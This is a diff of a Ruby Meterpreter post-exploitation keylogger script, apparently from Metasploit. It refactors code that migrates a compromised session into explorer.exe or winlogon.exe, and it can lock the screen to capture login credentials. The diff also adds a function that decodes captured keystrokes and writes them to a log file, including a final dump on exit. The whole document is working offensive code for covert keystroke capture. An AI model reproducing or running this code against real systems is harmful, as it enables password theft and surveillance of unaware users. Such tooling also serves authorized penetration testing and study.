@@ -52,34 +52,34 @@ end
 #Function to Migrate in to Explorer process to be able to interact with desktop
 def explrmigrate(session,captype,lock)
 	#begin
-		if captype.to_i == 0
-			process2mig = "explorer.exe"
-		elsif captype.to_i == 1
-			if is_uac_enabled?
-				print_error("UAC is enabled on this host! Winlogon migration will be blocked.")
-				raise Rex::Script::Completed
-			end
-			process2mig = "winlogon.exe"
-			if lock
-				lock_screen
-			end
-		else
-			process2mig = "explorer.exe"
+	if captype.to_i == 0
+		process2mig = "explorer.exe"
+	elsif captype.to_i == 1
+		if is_uac_enabled?
+			print_error("UAC is enabled on this host! Winlogon migration will be blocked.")
+			raise Rex::Script::Completed
 		end
-		# Actual migration
-		mypid = session.sys.process.getpid
-		session.sys.process.get_processes().each do |x|
-			if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
-				print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
-				session.core.migrate(x['pid'].to_i)
-				print_status("Migration Successful!!")
-			end
+		process2mig = "winlogon.exe"
+		if lock
+			lock_screen
 		end
-		return true
-#	rescue
-#		print_status("Failed to migrate process!")
-#		return false
-#	end
+	else
+		process2mig = "explorer.exe"
+	end
+	# Actual migration
+	mypid = session.sys.process.getpid
+	session.sys.process.get_processes().each do |x|
+		if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
+			print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
+			session.core.migrate(x['pid'].to_i)
+			print_status("Migration Successful!!")
+		end
+	end
+	return true
+	#	rescue
+	#		print_status("Failed to migrate process!")
+	#		return false
+	#	end
 end
 
 #Function for starting the keylogger
@@ -96,6 +96,38 @@ def startkeylogger(session)
 	end
 end
 
+def write_keylog_data session, logfile
+	data = session.ui.keyscan_dump
+	outp = ""
+	data.unpack("n*").each do |inp|
+		fl = (inp & 0xff00) >> 8
+		vk = (inp & 0xff)
+		kc = VirtualKeyCodes[vk]
+
+		f_shift = fl & (1<<1)
+		f_ctrl  = fl & (1<<2)
+		f_alt   = fl & (1<<3)
+
+		if(kc)
+			name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
+			case name
+			when /^.$/
+				outp << name
+			when /shift|click/i
+			when 'Space'
+				outp << " "
+			else
+				outp << " <#{name}> "
+			end
+		else
+			outp << " <0x%.2x> " % vk
+		end
+	end
+
+	sleep(2)
+	file_local_write(logfile,"#{outp}\n")
+end
+
 # Function for Collecting Capture
 def keycap(session, keytime, logfile)
 	begin
@@ -105,38 +137,15 @@ def keycap(session, keytime, logfile)
 		#Inserting keystrokes every number of seconds specified
 		print_status("Recording ")
 		while rec == 1
-			#getting Keystrokes
-			data = session.ui.keyscan_dump
-			outp = ""
-			data.unpack("n*").each do |inp|
-				fl = (inp & 0xff00) >> 8
-				vk = (inp & 0xff)
-				kc = VirtualKeyCodes[vk]
+			#getting and writing Keystrokes
+			write_keylog_data session, logfile
 
-				f_shift = fl & (1<<1)
-				f_ctrl  = fl & (1<<2)
-				f_alt   = fl & (1<<3)
-
-				if(kc)
-					name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
-					case name
-					when /^.$/
-						outp << name
-					when /shift|click/i
-					when 'Space'
-						outp << " "
-					else
-						outp << " <#{name}> "
-					end
-				else
-					outp << " <0x%.2x> " % vk
-				end
-			end
-			sleep(2)
-			file_local_write(logfile,"#{outp}\n")
 			sleep(keytime.to_i)
 		end
 	rescue::Exception => e
+		print_status "Saving last few keystrokes"
+		write_keylog_data session, logfile
+
 		print("\n")
 		print_status("#{e.class} #{e}")
 		print_status("Stopping keystroke sniffer...")
